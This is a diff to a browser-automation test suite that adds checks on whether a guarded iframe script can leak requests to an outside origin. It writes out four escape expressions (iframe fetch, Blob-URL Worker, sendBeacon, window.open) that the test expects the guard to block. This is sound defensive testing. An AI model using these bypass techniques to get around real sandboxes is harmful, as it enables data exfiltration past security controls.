@@ -314,6 +314,21 @@ async function main() {
           await sleep(300);
           need((await state()).collected.length === before, "eval.frame.guard", `the fresh origin received ${(await state()).collected.length - before} request(s) from the held script (run ${n}; contained ${leak.contained || "?"})`);
         }
+        // Other ways out of a guarded script: a fresh same-origin iframe (its window has no shim), a Worker made from that iframe (its own network), a beacon from it, window.open.
+        // None may reach the fresh origin; the browser-level guard (Fetch on every session, children paused at birth) is what stops them.
+        const L = JSON.stringify(leakTo);
+        const escapes = /** @type {Record<string, string>} */ ({
+          "iframe fetch": `(async () => { const f = document.createElement('iframe'); document.body.appendChild(f); try { await f.contentWindow.fetch(${L} + 'iframefetch'); } catch (e) {} return 1; })()`,
+          "iframe worker (Blob URL)": `(async () => { const f = document.createElement('iframe'); document.body.appendChild(f); try { const b = new f.contentWindow.Blob(["fetch('" + ${L} + "worker').catch(function () {});"]); const w = new f.contentWindow.Worker(f.contentWindow.URL.createObjectURL(b)); await new Promise(function (r) { setTimeout(r, 400); }); } catch (e) {} return 1; })()`,
+          "iframe beacon": `(async () => { const f = document.createElement('iframe'); document.body.appendChild(f); try { f.contentWindow.navigator.sendBeacon(${L} + 'beacon', 'x'); } catch (e) {} return 1; })()`,
+          "window.open": `(() => { try { window.open(${L} + 'open'); } catch (e) {} return 1; })()`,
+        });
+        for (const [name, expression] of Object.entries(escapes)) {
+          const r = await step(`escape attempt: ${name}`, () => mcp.call("chrome_eval", { tab, frame: "b.localhost", expression }));
+          console.log("[frames-suite] ESCAPE " + JSON.stringify({ name, held: r.held, contained: r.contained, why: String(r.why || r.error || "").slice(0, 140) }));
+          await sleep(500);
+          need((await state()).collected.length === before, "eval.frame.guard", `escape "${name}" reached the fresh origin (${(await state()).collected.length - before} request(s)): ${short(r)}`);
+        }
         const own = await step("the iframe's own API call is not held", () => mcp.call("chrome_eval", { tab, frame: "b.localhost", expression: "window.__api('GET', '/api/workflows').then(function (r) { return r.status; })" }));
         need(!own.held && own.ok !== false && val(own) === 200, "eval.frame.guard", `the iframe's own API call was refused or failed: ${short(own)}`);
         return { titleTop: val(inTop), titleFrame: val(inApp), leakHeld: true, ownApiStatus: val(own) };
